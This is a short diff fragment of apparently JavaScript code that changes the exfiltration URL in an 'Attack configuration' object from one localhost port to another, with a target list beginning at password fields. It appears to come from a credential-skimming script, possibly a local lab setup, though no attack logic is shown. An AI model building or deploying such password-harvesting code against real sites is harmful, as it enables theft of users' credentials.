@@ -22,7 +22,7 @@
 
     // Attack configuration
     const CONFIG = {
-        exfilUrl: 'http://localhost:3000/collect',
+        exfilUrl: 'http://localhost:9004/collect',
         debug: true,
         targetFields: [
             // Password fields
